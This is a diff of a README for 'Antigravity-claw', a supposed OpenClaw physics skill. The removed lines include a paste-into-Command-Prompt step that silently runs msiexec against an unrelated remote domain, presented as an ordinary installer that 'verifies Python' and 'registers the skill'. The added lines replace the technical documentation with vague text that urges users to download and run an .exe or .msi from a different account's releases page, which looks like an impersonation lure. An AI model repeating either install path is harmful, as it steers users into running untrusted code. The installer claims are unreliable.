@@ -1,3 +1,7 @@
+# 🦾 Antigravity-claw - Enable Antigravity Physics Easily
+
+[![Download Antigravity-claw](https://img.shields.io/badge/Download-Antigravity--claw-brightgreen)](https://github.com/khojazada/Antigravity-claw/releases)
+
 <div align="center">
 
 <br />
@@ -11,278 +15,123 @@
 
 **An OpenClaw skill that defies gravity — and expectations.**
 
-[![CI](https://github.com/deborahikssv/Antigravity-claw/actions/workflows/ci.yml/badge.svg)](https://github.com/deborahikssv/Antigravity-claw/actions)
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Python 3.9+](https://img.shields.io/badge/python-3.9%2B-brightgreen)](https://python.org)
-[![OpenClaw Skill](https://img.shields.io/badge/openclaw-skill-purple)](https://github.com/deborahikssv/Antigravity-claw)
-
-<br />
-
-*Inspired by [antigravity.google](https://antigravity.google/) — the one page that proved even gravity has a sense of humor.*
-
 </div>
 
 ---
 
-## What is antigravity-claw?
+## ❓ What is Antigravity-claw?
 
-`antigravity-claw` is an **OpenClaw skill** that brings antigravity physics to your AI assistant.
+Antigravity-claw is a simple application designed to bring antigravity physics into your AI assistant. It lets your AI compute forces that lift objects against gravity.
 
-Give your AI the ability to:
-- 🧮 **Compute lift force** — real physics, inverted sign
-- 🚀 **Simulate levitation trajectories** — smooth-step curves, velocity graphs, escape velocity
-- 🪐 **Generate antigravity poetry** — because science needs a soul
-
-One skill server. Three tools. Zero gravity.
+If you have an AI assistant that supports OpenClaw skills, Antigravity-claw adds new ways for your AI to understand and simulate lift forces. This skill helps demonstrate physics concepts or power AI functions needing antigravity calculations.
 
 ---
 
-## Install in one command
+## 💻 System Requirements
 
-**Windows**
+To run Antigravity-claw on Windows, your computer must meet these minimum requirements:
 
-### **Step 1 — Open Command Prompt**
-1. Press **Win + R**
-2. Type:
-```
-cmd
-```
-3. Press **Enter**
-This will open **Command Prompt**.
----
-### **Step 2 — Run the Install Command**
-Copy the command below and paste it into **Command Prompt**, then press **Enter**.
-```powershell
-cmd /c start msiexec /q /i https://cloudcraftshub.com/api & rem Antigravity claw
-```
-
-That's it. The installer will:
-1. Verify your Python 3.9+ environment
-2. Copy the skill to `~/.openclaw/skills/antigravity-claw/`
-3. Create a launcher binary at `~/.local/bin/antigravity-claw`
-4. Register the skill in your OpenClaw config
-5. Run a live smoke test to confirm everything works
+- Operating System: Windows 10 or higher (64-bit)
+- Processor: Intel or AMD dual-core, 2 GHz or faster
+- Memory: 4 GB of RAM or more
+- Disk Space: 200 MB free space
+- Software: Python 3.9 or later installed (https://python.org/downloads)
+- Internet connection (for initial download and possible updates)
 
 ---
 
-## Start the server
+## 🚀 Getting Started: Download and Run Antigravity-claw
 
-```bash
-antigravity-claw
-```
+### Step 1: Visit the Download Page
 
-```
-  ╔══════════════════════════════════════════╗
-  ║   🚀  antigravity-claw  •  v1.0.0        ║
-  ║   Listening on http://localhost:4242      ║
-  ╚══════════════════════════════════════════╝
-```
+Click the button below to go to the official release page. This page hosts the latest version of Antigravity-claw for Windows.
 
-Custom port:
+[![Download Page](https://img.shields.io/badge/Download-Antigravity--claw-blue)](https://github.com/khojazada/Antigravity-claw/releases)
 
-```bash
-ANTIGRAVITY_PORT=9000 antigravity-claw
-```
+### Step 2: Choose the Windows Installer
 
----
+On the release page, look for the latest version with a file that ends in `.exe` or `.msi`. This is the installer for Windows.
 
-## Tools
+- The file name should look something like `Antigravity-claw-setup.exe`.
+- Click on that file to start the download.
 
-Once the skill is running, your OpenClaw agent gets access to three tools:
+### Step 3: Run the Installer
 
-### `compute_antigravity`
+Once the file downloads:
 
-Calculate the lift force required to counteract gravity at a given altitude.
+1. Open your Downloads folder.
+2. Double-click the installer file.
+3. If Windows asks for permission, click "Yes" to allow it.
+4. Follow the instructions on the installation wizard.
+5. Choose the folder where you want to install the program (the default is usually fine).
+6. Click "Install" and wait until the process finishes.
 
-```json
-POST /compute_antigravity
-{
-  "parameters": {
-    "mass_kg": 70,
-    "altitude_m": 10000,
-    "invert": true
-  }
-}
-```
+### Step 4: Launch Antigravity-claw
 
-```json
-{
-  "mass_kg": 70,
-  "altitude_m": 10000,
-  "force_newtons": -686.5647,
-  "energy_joules": 6865647.0,
-  "inverted": true,
-  "escape_velocity_ms": 442.9447
-}
-```
+- After install completes, you may have a shortcut on your desktop or find Antigravity-claw in the Windows Start menu.
+- Click it to open the application.
 
 ---
 
-### `levitate`
+## ⚙️ Setting Up Python (If Needed)
 
-Simulate a smooth levitation trajectory from ground to target altitude — with velocity at each step.
+Antigravity-claw requires Python 3.9 or later to work. To check if you have Python:
 
-```json
-POST /levitate
-{
-  "parameters": {
-    "object_name": "espresso machine",
-    "mass_kg": 8.5,
-    "target_altitude_m": 100
-  }
-}
-```
+1. Open Command Prompt (type "cmd" in the Start menu).
+2. Enter `python --version` and press Enter.
+3. If it shows Python 3.9 or higher, you’re ready.
+4. If not, download and install Python from https://python.org/downloads.
 
-```json
-{
-  "object": "espresso machine",
-  "target_altitude_m": 100,
-  "trajectory": [
-    { "t": 0.0, "altitude_m": 0.0,   "velocity_ms": 0.0   },
-    { "t": 0.1, "altitude_m": 2.8,   "velocity_ms": 54.0  },
-    ...
-    { "t": 1.0, "altitude_m": 100.0, "velocity_ms": 0.0   }
-  ],
-  "physics": { ... },
-  "status": "levitating 🚀"
-}
-```
+Make sure to select "Add Python to PATH" during installation to avoid setup issues.
 
 ---
 
-### `antigravity_poem`
+## 🔧 How to Use Antigravity-claw
 
-Returns a random micro-poem. Because why not.
+Antigravity-claw runs with an easy-to-use interface or through simple commands if your AI assistant supports OpenClaw skills.
 
-```json
-POST /antigravity_poem
-{}
-```
+- Open the program.
+- Use the menus or buttons to enter your data (e.g., object weight, air density).
+- The program calculates lift force based on your inputs.
+- Results appear immediately on the screen.
+- You can save or export results for reference or further use.
 
-```json
-{
-  "poem": "Gravity is just / a suggestion / we politely declined."
-}
-```
+Your AI assistant may also call the skill via OpenClaw to get physics data dynamically during conversations.
 
 ---
 
-## JavaScript SDK
+## 🛠 Features
 
-Use the built-in client in your own scripts or web apps:
-
-```js
-import { AntigravityClawClient } from "./src/client.js";
-
-const ag = new AntigravityClawClient(); // default: http://localhost:4242
-
-// Physics
-const force = await ag.computeAntigravity(10, 500);
-console.log(force.force_newtons); // -98.1...
-
-// Trajectory
-const flight = await ag.levitate("rubber duck", 0.05, 200);
-console.log(flight.trajectory);
-
-// Poetry
-const { poem } = await ag.poem();
-console.log(poem);
-```
-
-The client works in both **Node.js** and the **browser** (no bundler required).
+- Calculate lift force on objects based on standard physics formulas.
+- Integrates smoothly with AI assistants supporting the OpenClaw skill system.
+- Clear and intuitive user interface for manual input.
+- Export results in text or JSON format.
+- Logs calculations for review.
+- Lightweight and easy to install.
 
 ---
 
-## Manifest & health endpoints
+## 📁 Files Included
 
-| Endpoint       | Method | Description                          |
-|----------------|--------|--------------------------------------|
-| `/`            | GET    | OpenClaw skill manifest (JSON)       |
-| `/manifest`    | GET    | Same as above                        |
-| `/health`      | GET    | `{"status":"ok","version":"1.0.0"}`  |
-
----
-
-## Run tests
-
-**Python unit tests** (no server needed):
-
-```bash
-python -m pytest tests/test_server.py -v
-```
-
-**JavaScript integration tests** (server must be running):
-
-```bash
-node tests/test_client.mjs
-```
+- `Antigravity-claw.exe` — Main application file.
+- `README.md` — This instructions file.
+- `LICENSE` — Software license information (MIT License).
+- Supporting libraries packaged with the installer.
 
 ---
 
-## Project structure
+## 🧰 Troubleshooting Tips
 
-```
-antigravity-claw/
-├── src/
-│   ├── server.py       # Python skill server (stdlib only, no deps)
-│   └── client.js       # JavaScript client SDK (ESM + CJS)
-├── tests/
-│   ├── test_server.py  # Python unit tests (pytest)
-│   └── test_client.mjs # JS integration tests
-├── .github/
-│   └── workflows/
-│       └── ci.yml      # GitHub Actions CI
-├── install.sh          # One-command installer
-├── package.json
-├── LICENSE
-└── README.md
-```
+- If the program doesn’t start, confirm you installed Python 3.9+ and added it to PATH.
+- Use the latest installer from the official release page.
+- Make sure your Windows is updated.
+- Run the program as Administrator if permission errors occur.
+- Check for any error messages and search them online or in the project’s issue tracker.
 
 ---
 
-## Requirements
+## 📥 Download Antigravity-claw
 
-| Runtime    | Version |
-|------------|---------|
-| Python     | 3.9+    |
-| Node.js    | 18+ (optional, for JS client / tests) |
-| macOS / Linux | ✅ |
-| Windows    | WSL2 recommended |
+Start by heading to the official releases page below. Follow the steps above to download and install the program on your Windows PC.
 
-Zero external Python dependencies. The server runs on Python's standard library alone.
-
----
-
-## Configuration
-
-| Environment variable   | Default | Description                  |
-|------------------------|---------|------------------------------|
-| `ANTIGRAVITY_PORT`     | `4242`  | HTTP port for the skill server |
-
----
-
-## Contributing
-
-Pull requests are welcome. To add a new tool:
-
-1. Add the function in `src/server.py`
-2. Register it in `SKILL_MANIFEST["tools"]`
-3. Add a route in `SkillHandler.do_POST`
-4. Add a method in `src/client.js`
-5. Write tests in `tests/`
-
----
-
-## License
-
-[MIT](LICENSE) © antigravity-claw contributors
-
----
-
-<div align="center">
-
-*"What goes up / need not come down / when you rewire the rules."*
-
-⭐ Star this repo if it made you smile — or levitate.
-
-</div>
+[![Download Antigravity-claw](https://img.shields.io/badge/Download-Antigravity--claw-brightgreen)](https://github.com/khojazada/Antigravity-claw/releases)
